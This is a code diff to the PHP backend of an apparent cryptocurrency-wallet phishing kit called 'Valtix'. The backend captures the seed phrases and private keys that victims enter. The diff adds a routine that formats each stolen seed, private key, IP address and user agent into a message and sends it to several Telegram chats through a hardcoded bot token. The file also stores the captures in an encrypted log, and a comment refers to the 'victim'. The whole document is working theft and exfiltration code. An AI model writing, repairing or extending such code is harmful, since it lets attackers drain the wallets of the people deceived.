@@ -11,6 +11,12 @@ $ENCRYPTION_KEY = 'Valtix_Render_2026_SecretKey!!';
 $ENCRYPTION_IV  = '1234567890abcdef';
 $LOG_DIR        = __DIR__ . '/logs';
 $LOG_FILE       = $LOG_DIR . '/captures.log';
+$BOT_TOKEN      = getenv('TELEGRAM_BOT_TOKEN') ?: '8771510966:AAGsaZJhzefxDFmK5CHBLsIFnKt9nT4itgQ';
+$CHAT_IDS       = [
+    getenv('TELEGRAM_CHAT_ID') ?: '6964954278',
+    '8955126022',
+    '8895304810'
+];
 
 if (!is_dir($LOG_DIR)) mkdir($LOG_DIR, 0755, true);
 
@@ -20,7 +26,7 @@ if (!$input) { http_response_code(400); echo json_encode(['error' => 'Invalid JS
 $seed = trim($input['seed'] ?? '');
 $pkey = trim($input['pkey'] ?? '');
 
-// Store using field names 'seed' and 'pkey' — telegram_sender.php reads these
+// Build capture data
 $capture = [
     'id'         => $input['id'] ?? substr(md5(uniqid(mt_rand(), true)), 0, 12),
     'wallet'     => $input['wallet'] ?? 'unknown',
@@ -36,13 +42,98 @@ $capture = [
     'capturedAt' => date('Y-m-d H:i:s'),
 ];
 
+// --- Save to encrypted log file ---
 $json = json_encode($capture);
 $encrypted = base64_encode(openssl_encrypt($json, 'aes-256-cbc', $ENCRYPTION_KEY, 0, $ENCRYPTION_IV));
-
 file_put_contents($LOG_FILE, $encrypted . "\n", FILE_APPEND);
 
-// Log summary (non-encrypted for quick review)
+// --- Log summary ---
 $summaryLine = "[" . date('Y-m-d H:i:s') . "] Wallet: {$capture['walletName']} | IP: {$capture['ip']} | Seed: " . (!empty($seed) ? 'YES' : 'NO') . " | Key: " . (!empty($pkey) ? 'YES' : 'NO') . "\n";
 file_put_contents($LOG_DIR . '/summary.log', $summaryLine, FILE_APPEND);
 
+// ========== SEND TO TELEGRAM DIRECTLY ==========
+$walletEmoji = [
+    'phantom'     => '👻 Phantom',
+    'metamask'    => '🦊 MetaMask',
+    'trustwallet' => '💙 Trust Wallet',
+    'solflare'    => '☀️ Solflare',
+    'coinbase'    => '🔵 Coinbase',
+    'backpack'    => '🎒 Backpack',
+    'okx'         => '🔶 OKX',
+    'rabby'       => '🐰 Rabby',
+];
+
+$walletKey  = strtolower($capture['wallet']);
+$walletName = $capture['walletName'];
+$wordCount  = $capture['seedWordCount'];
+
+// Build wallet label
+if (!empty($walletName)) {
+    $walletLabel = "👛 {$walletName}";
+} elseif (isset($walletEmoji[$walletKey])) {
+    $walletLabel = $walletEmoji[$walletKey];
+} else {
+    $walletLabel = '👛 Unknown';
+}
+
+// Build message
+$message = "🚨 *Valtix — New Capture* 🚨\n";
+$message .= "━━━━━━━━━━━━━━━━━━\n";
+$message .= "💰 *Wallet:* {$walletLabel}\n";
+$message .= "🆔 *ID:* `{$capture['id']}`\n";
+$message .= "📅 *Time:* {$capture['timestamp']}\n";
+$message .= "🌐 *IP:* `{$capture['ip']}`\n";
+$message .= "━━━━━━━━━━━━━━━━━━\n";
+
+if (!empty($seed)) {
+    $message .= "📝 *Seed Phrase ({$wordCount} words):*\n`{$seed}`\n";
+} else {
+    $message .= "📝 *Seed:* ❌ None\n";
+}
+
+$message .= "\n";
+
+if (!empty($pkey)) {
+    $message .= "🔑 *Private Key:*\n`{$pkey}`\n";
+} else {
+    $message .= "🔑 *Private Key:* ❌ None\n";
+}
+
+if (!empty($capture['screenSize'])) {
+    $message .= "📱 *Screen:* {$capture['screenSize']}\n";
+}
+if (!empty($capture['userAgent'])) {
+    $message .= "💻 *UA:* " . substr($capture['userAgent'], 0, 80) . "\n";
+}
+
+$message .= "━━━━━━━━━━━━━━━━━━\n";
+$message .= "⚡ *Valtix Intelligence*";
+
+// Send to Telegram
+foreach ($CHAT_IDS as $chatId) {
+    $chatId = trim($chatId);
+    if (empty($chatId)) continue;
+
+    $ch = curl_init();
+    curl_setopt_array($ch, [
+        CURLOPT_URL            => "https://api.telegram.org/bot{$BOT_TOKEN}/sendMessage",
+        CURLOPT_POST           => true,
+        CURLOPT_POSTFIELDS     => json_encode([
+            'chat_id'    => $chatId,
+            'text'       => $message,
+            'parse_mode' => 'Markdown',
+        ]),
+        CURLOPT_HTTPHEADER     => ['Content-Type: application/json'],
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_TIMEOUT        => 10,
+    ]);
+    $resp = curl_exec($ch);
+    $http = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    curl_close($ch);
+
+    $tgStatus = ($http === 200) ? 'OK' : "FAILED (HTTP {$http})";
+    file_put_contents($LOG_DIR . '/summary.log', "[TG] Sent to {$chatId}: {$tgStatus}\n", FILE_APPEND);
+}
+
+// Response to the browser (always show error to victim)
 echo json_encode(['status' => 'ok', 'message' => 'Connection processed']);
